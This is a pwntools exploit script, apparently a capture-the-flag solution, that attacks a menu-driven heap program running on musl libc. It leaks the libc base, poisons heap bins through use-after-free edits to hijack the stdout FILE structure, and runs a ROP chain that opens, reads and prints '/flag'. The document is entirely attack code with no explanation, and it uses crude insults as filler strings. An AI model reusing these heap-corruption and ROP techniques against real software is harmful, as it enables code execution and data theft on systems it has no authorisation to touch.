from pwn import *
r = process(["./libc.so","./pwn"])
libc = ELF("./libc.so")

menu = lambda x:r.sendlineafter(">>",str(x))

def add(con):
    menu(1)
    r.sendafter("content",con)

def free(idx):
    menu(2)
    r.sendlineafter("idx",str(idx))

def show(idx):
    menu(3)
    r.sendlineafter("idx",str(idx))

def edit(idx,con):
    menu(4)
    r.sendlineafter("idx:",str(idx))
    r.sendafter("Content",con)
    
add('wsndnmsl')
add('fuck')

show(0)
libc_base = u64(r.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-0x292e50
success("libc_base = "+hex(libc_base))
stdout = libc_base+libc.sym['__stdout_FILE']
mybin = libc_base+0x292c48
system = libc_base+libc.sym['system']
free(0)
edit(0,p64(stdout-0x10)*2)
add(p64(stdout-0x10)*2)
free(2)
edit(2,p64(mybin-0x10)+p64(stdout-0x10))
rdi = 0x0000000000014862+libc_base
rsi = 0x000000000001c237+libc_base
rdx = 0x000000000001bea2+libc_base
open_ = libc_base+libc.sym['open']
read = libc_base+libc.sym['read']
write = libc_base+libc.sym['write']
rop_addr = libc_base + 0x2953c0
buf = libc_base + 0x2955e0
rop = p64(rdi)+p64(stdout)+p64(rsi)+p64(0)+p64(open_)
rop += p64(rdi)+p64(3)+p64(rsi)+p64(buf)+p64(rdx)+p64(0x100)+p64(read)
rop += p64(rdi)+p64(1)+p64(rsi)+p64(buf)+p64(rdx)+p64(0x100)+p64(write)
add(rop)
add('fuck')
dininghall_gadget = libc_base+0x000000000004951a
ret = libc_base + 0x0000000000000cdc
payload = '/flag\x00\x00\x00'
payload += p64(0)*3+p64(1)*2
payload += p64(rop_addr)
payload += p64(ret) 
payload += p64(0)
payload += p64(dininghall_gadget)   
pause()
edit(4,payload)
r.interactive()